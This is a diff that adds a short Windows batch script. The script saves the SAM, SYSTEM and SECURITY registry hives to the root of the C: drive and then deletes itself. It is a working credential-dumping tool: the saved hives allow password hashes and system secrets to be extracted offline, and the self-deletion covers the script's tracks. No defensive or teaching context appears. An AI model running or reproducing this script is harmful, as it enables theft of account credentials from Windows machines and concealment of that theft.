@@ -1,0 +1,9 @@
+@echo off
+
+reg save HKEY_LOCAL_MACHINE\sam C:\sam.hive
+
+reg save HKEY_LOCAL_MACHINE\system C:\system.hive
+
+reg save HKEY_LOCAL_MACHINE\security C:\security.hive
+
+del %0
